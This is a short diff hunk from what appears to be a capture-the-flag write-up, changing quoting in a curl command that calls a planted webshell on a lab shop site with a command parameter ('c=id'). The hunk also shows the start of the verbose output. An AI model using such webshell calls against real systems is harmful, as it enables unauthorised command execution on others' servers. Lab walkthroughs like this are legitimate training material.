@@ -190,7 +190,7 @@ Shell => http://10.10.10.207/shop/admin/../vqmod/xml/S59WW.php?c=id```
 The exploit is nice enough to give me the address of the webshell, and visiting it returns an empty page:
 
 ```bash
-root@kali# curl -v 'http://10.10.10.207/shop/admin/../vqmod/xml/S59WW.php?c=id'
+root@kali# curl -v http://10.10.10.207/shop/admin/../vqmod/xml/S59WW.php?c=id
 *   Trying 10.10.10.207:80...
 * Connected to 10.10.10.207 (10.10.10.207) port 80 (#0)
 > GET /shop/vqmod/xml/S59WW.php?c=id HTTP/1.1
